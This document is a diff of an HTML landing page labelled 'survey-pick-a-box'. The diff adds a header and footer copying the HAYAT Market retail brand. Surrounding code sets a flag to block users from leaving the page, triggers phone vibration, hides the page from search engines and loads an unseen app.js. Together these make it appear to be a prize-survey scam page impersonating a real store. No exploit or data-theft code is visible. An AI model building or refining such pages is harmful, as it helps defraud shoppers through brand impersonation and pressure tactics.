@@ -8,12 +8,201 @@
     <meta name="lander" content="survey-pick-a-box" />
     <meta name="description" content="survey-pick-a-box" />
     <link rel="shortcut icon" href="data:image/x-icon" type="image/x-icon" />
-
     <meta name="robots" content="noindex,nofollow" />
   </head>
-  <img src="https://i.ibb.co/ccS0D5P1/prime.jpg" width="100%" />
+  <body>
+    <!-- Header -->
+    <header class="main-header">
+      <div class="header-container">
+        <!-- Left: Hamburger Menu -->
+        <button class="header-menu-btn" aria-label="Menu">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <line x1="3" y1="6" x2="21" y2="6" stroke="black" stroke-width="2" stroke-linecap="round"/>
+            <line x1="3" y1="12" x2="21" y2="12" stroke="black" stroke-width="2" stroke-linecap="round"/>
+            <line x1="3" y1="18" x2="21" y2="18" stroke="black" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </button>
+
+        <!-- Center: Logo -->
+        <div class="header-logo">
+          <div class="logo-english">
+            <span class="logo-hayat">HAYAT</span>
+            <span class="logo-market">market</span>
+          </div>
+          <svg class="logo-leaf" width="32" height="32" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <defs>
+              <linearGradient id="leafGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                <stop offset="0%" style="stop-color:#00C853;stop-opacity:1" />
+                <stop offset="100%" style="stop-color:#00A651;stop-opacity:1" />
+              </linearGradient>
+            </defs>
+            <path d="M16 4C12 4 8 6 6 10C4 14 4 18 6 22C8 26 12 28 16 28C20 28 24 26 26 22C28 18 28 14 26 10C24 6 20 4 16 4Z" fill="url(#leafGradient)"/>
+            <path d="M16 6C18 6 20 7 21 9C22 11 22 13 21 15C20 17 18 18 16 18C14 18 12 17 11 15C10 13 10 11 11 9C12 7 14 6 16 6Z" fill="#4CAF50" fill-opacity="0.6"/>
+            <path d="M14 8L18 12L16 14L12 10L14 8Z" fill="#66BB6A" fill-opacity="0.8"/>
+            <path d="M16 4L16 28M4 16L28 16" stroke="#00A651" stroke-width="0.5" stroke-opacity="0.3"/>
+          </svg>
+          <div class="logo-arabic">
+            <div class="arabic-banner">سوق</div>
+            <span class="arabic-text">حياة</span>
+          </div>
+        </div>
+
+        <!-- Right: Icons -->
+        <div class="header-icons">
+          <button class="header-icon-btn" aria-label="Search">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="11" cy="11" r="7" stroke="black" stroke-width="2"/>
+              <line x1="16" y1="16" x2="21" y2="21" stroke="black" stroke-width="2" stroke-linecap="round"/>
+            </svg>
+          </button>
+          <button class="header-icon-btn" aria-label="Gift">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <!-- Gift box -->
+              <rect x="5" y="8" width="14" height="11" stroke="black" stroke-width="1.5" fill="none" rx="1"/>
+              <!-- Vertical ribbon -->
+              <line x1="12" y1="8" x2="12" y2="19" stroke="black" stroke-width="1.5"/>
+              <!-- Horizontal ribbon -->
+              <line x1="5" y1="13" x2="19" y2="13" stroke="black" stroke-width="1.5"/>
+              <!-- Bow loops -->
+              <path d="M10 5C10 4.44772 10.4477 4 11 4C11.5523 4 12 4.44772 12 5C12 5.55228 11.5523 6 11 6C10.4477 6 10 5.55228 10 5Z" fill="black"/>
+              <path d="M12 5C12 4.44772 12.4477 4 13 4C13.5523 4 14 4.44772 14 5C14 5.55228 13.5523 6 13 6C12.4477 6 12 5.55228 12 5Z" fill="black"/>
+              <!-- Bow center knot -->
+              <circle cx="12" cy="5" r="1.5" fill="black"/>
+              <!-- Bow tails -->
+              <path d="M10 5L9 7M14 5L15 7" stroke="black" stroke-width="1" stroke-linecap="round"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+    </header>
+
   <img src="https://i.ibb.co/S7KPfR2D/main.png" width="99%" />
 
+  <style>
+    /* Header Styles */
+    .main-header {
+      background-color: #ffffff;
+      border-top: 1px solid #e0e0e0;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 12px 20px;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+
+    .header-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      max-width: 1400px;
+      margin: 0 auto;
+    }
+
+    .header-menu-btn,
+    .header-icon-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.2s;
+    }
+
+    .header-menu-btn:hover,
+    .header-icon-btn:hover {
+      opacity: 0.7;
+    }
+
+    .header-logo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex: 1;
+      justify-content: center;
+    }
+
+    .logo-english {
+      display: flex;
+      align-items: baseline;
+      gap: 4px;
+    }
+
+    .logo-hayat {
+      font-size: 32px;
+      font-weight: 700;
+      color: #DC143C;
+      letter-spacing: 1px;
+      line-height: 1;
+    }
+
+    .logo-market {
+      font-size: 16px;
+      font-weight: 500;
+      color: #00A651;
+      text-decoration: underline;
+      text-decoration-thickness: 1px;
+      text-underline-offset: 3px;
+      line-height: 1;
+    }
+
+    .logo-leaf {
+      flex-shrink: 0;
+    }
+
+    .logo-arabic {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-start;
+      position: relative;
+    }
+
+    .arabic-banner {
+      background-color: #DC143C;
+      color: #ffffff;
+      font-size: 10px;
+      font-weight: 600;
+      padding: 2px 6px;
+      border-radius: 2px;
+      position: absolute;
+      top: -12px;
+      right: 0;
+      white-space: nowrap;
+    }
+
+    .arabic-text {
+      font-size: 18px;
+      font-weight: 600;
+      color: #00A651;
+      line-height: 1.2;
+    }
+
+    .header-icons {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    @media (max-width: 768px) {
+      .logo-hayat {
+        font-size: 24px;
+      }
+      .logo-market {
+        font-size: 14px;
+      }
+      .logo-leaf {
+        width: 24px;
+        height: 24px;
+      }
+      .arabic-text {
+        font-size: 16px;
+      }
+      .main-header {
+        padding: 10px 15px;
+      }
+    }
+  </style>
   <style>
     .app {
       align-items: center;
@@ -378,10 +567,7 @@
       view.download = 1;
       view.noredir = false;
     </script>
-    <script
-      src="hayat/app.js"
-      type="application/javascript"
-    ></script>
+    <script src="hayat/app.js" type="application/javascript"></script>
 
     <script>
       var PreventExitPop = true;
@@ -412,10 +598,18 @@
       navigator.vibrate([1000, 300, 1000, 300, 1000]);
     </script>
 
-    <img src="https://i.imgur.com/iPeJwyN.jpeg" width="100%" />
-
-  </body>
-  <script>
+    <div
+      class="footer"
+      style="
+        text-align: center;
+        padding: 30px 10px;
+        background-color: #000;
+        color: #fff;
+      "
+    >
+      <p>Copyright © 2025 HAYAT Market. All rights reserved.</p>
+    </div>
+    <script>
     "undefined" === typeof _trfq || (window._trfq = []);
     "undefined" === typeof _trfd && (window._trfd = []),
       _trfd.push(
@@ -428,4 +622,5 @@
       ); // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.
   </script>
   <script src="https://img1.wsimg.com/traffic-assets/js/tccl.min.js"></script>
+  </body>
 </html>
